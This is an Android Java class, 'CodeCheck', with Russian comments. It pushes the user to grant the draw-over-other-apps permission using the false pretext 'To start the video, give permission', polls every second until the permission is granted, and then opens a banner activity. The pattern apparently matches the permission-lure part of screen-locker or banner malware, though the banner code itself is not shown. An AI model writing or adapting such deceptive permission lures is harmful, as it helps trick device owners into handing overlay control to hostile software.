package com.kxkxxkxmxkkxck;

import android.content.Context;
import android.app.AppOpsManager;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.widget.Toast;
import android.os.Handler;

public class CodeCheck {
    private Context context;
    private Handler handler;
    private Runnable runnable;
    private boolean isPermissionWindowOpen;
    private boolean isBannerActivityOpen;

    public CodeCheck(Context context) {
        this.context = context;
        this.handler = new Handler();
        this.runnable = new Runnable() {
            @Override
            public void run() {
                checkOverlayPermission();
            }
        };
    }

    public void startCheckingPermission() {
        checkOverlayPermission(); // Проверить разрешение сразу при запуске
    }

    private void checkOverlayPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(context)) {
                if (!isPermissionWindowOpen) {
                    // Разрешение не предоставлено, открыть настройки для предоставления разрешения
                    Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                            Uri.parse("package:" + context.getPackageName()));
                    context.startActivity(intent);
                    Toast.makeText(context, "To start the video, give permission", Toast.LENGTH_SHORT).show();
                    isPermissionWindowOpen = true;
                }
                // Разрешение не предоставлено, продолжить проверку через определенное время
                handler.postDelayed(runnable, 1000); // Проверить разрешение каждые 1 секунд
            } else {
                // Разрешение предоставлено, проверить если BannerActivity уже открыта
                if (!isBannerActivityOpen) {
                    // Открыть BannerActivity
                    Intent intent = new Intent(context, ActivityBannerActivity.class);
                    context.startActivity(intent);
                    isBannerActivityOpen = true;
                }
            }
        }
    }
    
    public void onPermissionWindowClosed() {
        isPermissionWindowOpen = false;
        checkOverlayPermission(); // Проверить разрешение после закрытия окна
    }
}